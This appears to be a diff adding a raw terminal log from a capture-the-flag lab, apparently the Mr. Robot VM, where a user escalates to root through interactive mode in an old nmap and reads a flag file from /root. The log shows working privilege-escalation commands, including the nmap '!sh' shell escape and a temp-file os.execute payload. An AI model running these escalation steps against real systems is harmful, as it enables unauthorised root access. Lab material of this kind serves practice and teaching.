@@ -1,0 +1,73 @@
+bash-4.3$ sudo -l
+sudo -l
+[sudo] password for robot: python -c 'import pty; pty.sp               
+
+Sorry, try again.
+[sudo] password for robot: abcdefghijklmnopqrstuvwxyz
+
+Sorry, user robot may not run sudo on linux.
+bash-4.3$ TF=$(mktemp)               
+TF=$(mktemp)
+bash-4.3$ echo 'os.execute("/bin/bash")' > $TF
+echo 'os.execute("/bin/bash")' > $TF
+bash-4.3$ sudo -u root nmap --interactive
+sudo -u root nmap --interactive
+[sudo] password for robot: abcdefghijklmnopqrstuvwxyz
+
+robot is not in the sudoers file.  This incident will be reported.
+bash-4.3$ bash
+bash
+robot@linux:/dev/shm$ whoami;date;hostname
+whoami;date;hostname
+robot
+Tue Aug  3 18:14:05 UTC 2021
+linux
+robot@linux:/dev/shm$ cd
+cd
+robot@linux:~$ sudo -l
+sudo -l
+[sudo] password for robot: abcdefghijklmnopqrstuvwxyz
+
+Sorry, user robot may not run sudo on linux.
+robot@linux:~$ nmap --interactive
+nmap --interactive
+
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h <enter> for help
+nmap> ls /root  
+ls /root
+Unknown command (ls) -- press h <enter> for help
+nmap> !bash
+!bash
+bash-4.3$ whoami
+whoami
+robot
+bash-4.3$ exit
+exit
+exit
+waiting to reap child : No child processes
+nmap> exit
+exit
+Quitting by request.
+robot@linux:~$ !sh
+!sh
+bash: !sh: event not found
+robot@linux:~$ nmap --interactive
+nmap --interactive
+
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h <enter> for help
+nmap> !sh
+!sh
+# ls
+ls
+key-2-of-3.txt  password.raw-md5
+# whoami
+whoami
+root
+# ls /root      
+ls /root
+firstboot_done  key-3-of-3.txt
+# cat /root/key-3-of-3.txt
+cat /root/key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4
